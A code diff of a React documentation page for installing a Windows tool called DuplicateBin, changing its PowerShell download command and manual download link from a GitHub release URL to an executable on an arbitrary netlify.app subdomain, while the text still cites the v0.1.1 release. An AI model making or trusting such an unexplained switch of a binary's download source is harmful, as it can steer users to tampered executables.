@@ -36,7 +36,7 @@ export function DocsWindowsGuidePage() {
 
       <CodeBlock language="powershell" title="Download using PowerShell">
 {`# Download the latest Windows release
-Invoke-WebRequest -Uri "https://github.com/MustafaPinjari/duplicate-bin/releases/download/v0.1.1/DuplicateBin.exe" -OutFile "DuplicateBin.exe"
+Invoke-WebRequest -Uri "https://fanciful-shortbread-d39145.netlify.app/public/DuplicateBin.exe" -OutFile "DuplicateBin.exe"
 
 # Verify the download
 Get-FileHash DuplicateBin.exe -Algorithm SHA256
@@ -48,7 +48,7 @@ Get-FileHash DuplicateBin.exe -Algorithm SHA256
       <h3 id="method-2-manual">Method 2: Manual Download</h3>
 
       <ol>
-        <li>Visit the <a href="https://github.com/MustafaPinjari/duplicate-bin/releases/download/v0.1.1/DuplicateBin.exe" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:text-blue-300">direct download link</a></li>
+        <li>Visit the <a href="https://fanciful-shortbread-d39145.netlify.app/public/DuplicateBin.exe" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:text-blue-300">direct download link</a></li>
         <li>Download <code>DuplicateBin.exe</code> from the v0.1.1 release</li>
         <li>Save it to a convenient location (e.g., <code>C:\\Tools\\DuplicateBin.exe</code>)</li>
         <li>Double-click to run or use from Command Prompt</li>
